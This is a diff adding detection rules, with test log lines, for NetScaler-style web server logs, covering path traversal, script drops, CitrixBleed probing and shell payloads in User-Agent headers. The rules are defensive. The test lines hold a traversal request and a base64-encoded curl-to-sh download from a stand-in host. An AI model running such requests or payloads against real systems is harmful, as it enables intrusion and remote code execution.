@@ -1,0 +1,55 @@
+# Web server logs on the appliance (httperror.log, httpaccess.log, httpaccess-vpn.log).
+
+- id: httperror-script-request
+  title: Shell or PHP script referenced in httperror.log (CVE-2023-3519 hunting)
+  severity: high
+  sources: [httperror]
+  match:
+    raw_regex: '\.(sh|php)\b'
+  cve: [CVE-2023-3519]
+  references: [https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-201a]
+  tests:
+    positive:
+      - {source: httperror, line: '[Thu Oct 05 10:00:01.123456 2026] [core:error] [pid 1234] [client 203.0.113.9:4444] AH00037: Symbolic link not allowed or link target not accessible: /netscaler/ns_gui/vpn/a.php'}
+    negative:
+      - {source: httperror, line: '[Thu Oct 05 10:00:01.123456 2026] [ssl:info] [pid 1234] [client 10.0.0.5:4444] AH01964: Connection to child 3 established'}
+
+- id: httpaccess-cve-2019-19781-traversal
+  title: Path traversal to /vpns/ (CVE-2019-19781)
+  severity: high
+  sources: [httpaccess, httpaccess-vpn]
+  match:
+    raw_regex: '(/vpns?/\.\./|\.\./vpns/|%2e%2e/vpns/|/vpns/portal/scripts/(newbm|rmbm|picktheme)\.pl)'
+  cve: [CVE-2019-19781]
+  tests:
+    positive:
+      - {source: httpaccess, line: '203.0.113.9 - - [05/Oct/2026:10:00:01 +0000] "POST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1" 200 143 "-" "curl/8.1"'}
+    negative:
+      - {source: httpaccess, line: '192.0.2.10 - - [05/Oct/2026:10:00:01 +0000] "GET /vpn/index.html HTTP/1.1" 200 1432 "-" "Mozilla/5.0"'}
+
+- id: httpaccess-encoded-user-agent
+  title: Encoded or shell-like payload in the User-Agent (CVE-2026-88771 dropper)
+  severity: high
+  sources: [httpaccess, httpaccess-vpn]
+  match:
+    raw_regex: '"[^"]*(base64\s+-d|\|\s*(ba)?sh\b|\$\(|`|;\s*(curl|wget)\s|echo\s+[A-Za-z0-9+/=]{40,})[^"]*"\s*$'
+  cve: [CVE-2026-88771]
+  references: [https://unit42.paloaltonetworks.com/netscaler-zero-days-exploited/]
+  tests:
+    positive:
+      - {source: httpaccess-vpn, line: '203.0.113.9 - - [05/Oct/2026:10:00:01 +0000] "GET /vpn/index.html HTTP/1.1" 200 1432 "-" "echo Y3VybCAtcyBodHRwOi8vMjAzLjAuMTEzLjkvYSB8IHNo | base64 -d | sh"'}
+    negative:
+      - {source: httpaccess-vpn, line: '192.0.2.10 - - [05/Oct/2026:10:00:01 +0000] "GET /vpn/index.html HTTP/1.1" 200 1432 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"'}
+
+- id: httpaccess-getusername-scripted
+  title: Scripted client calling GetUserName (CitrixBleed session-token probing)
+  severity: medium
+  sources: [httpaccess, httpaccess-vpn]
+  match:
+    raw_regex: '/logon/LogonPoint/Authentication/GetUserName[^"]*"\s+\d{3}\s+\S+\s+"[^"]*"\s+"(python|curl|go-http|Wget|libwww|okhttp|aiohttp|httpx)'
+  cve: [CVE-2023-4966]
+  tests:
+    positive:
+      - {source: httpaccess-vpn, line: '203.0.113.9 - - [05/Oct/2026:10:00:01 +0000] "POST /logon/LogonPoint/Authentication/GetUserName HTTP/1.1" 200 40 "-" "python-requests/2.31"'}
+    negative:
+      - {source: httpaccess-vpn, line: '192.0.2.10 - - [05/Oct/2026:10:00:01 +0000] "POST /logon/LogonPoint/Authentication/GetUserName HTTP/1.1" 200 40 "-" "Mozilla/5.0"'}
